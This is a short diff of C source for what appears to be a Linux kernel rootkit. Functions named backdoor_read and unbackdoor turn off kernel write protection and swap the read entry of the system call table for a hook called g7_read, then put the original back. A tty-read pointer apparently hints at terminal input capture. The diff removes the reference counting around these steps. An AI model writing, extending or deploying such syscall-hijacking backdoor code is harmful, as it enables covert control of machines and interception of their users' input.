@@ -14,11 +14,9 @@ ssize_t (*current_tty_read)(struct file *, char *, size_t, loff_t *);
 void
 backdoor_read(void)
 {
-    if (atomic_inc_return(&read_install_count) == 1) {
-        disable_protection();
-        sys_calls[__NR_read] = (void *)g7_read;
-        enable_protection();
-    }
+    disable_protection();
+    sys_calls[__NR_read] = (void *)g7_read;
+    enable_protection();
 }
 
 void
@@ -61,15 +59,13 @@ unbackdoor(void)
 
         current_tty_read = NULL;
     } else if (sys_read) {
-        if (atomic_dec_return(&read_install_count) < 1) {
-            disable_protection();
-            sys_calls[__NR_read] = (void *)sys_read;
-            enable_protection();
+        disable_protection();
+        sys_calls[__NR_read] = (void *)sys_read;
+        enable_protection();
 
-            // Sleeping here is very important, as without it
-            // we would stall the CPU...
-            while ((cur = atomic_read(&read_count)) > 0)
-                msleep(250);
-        }
+        // Sleeping here is very important, as without it
+        // we would stall the CPU...
+        while ((cur = atomic_read(&read_count)) > 0)
+            msleep(250);
     }
 }
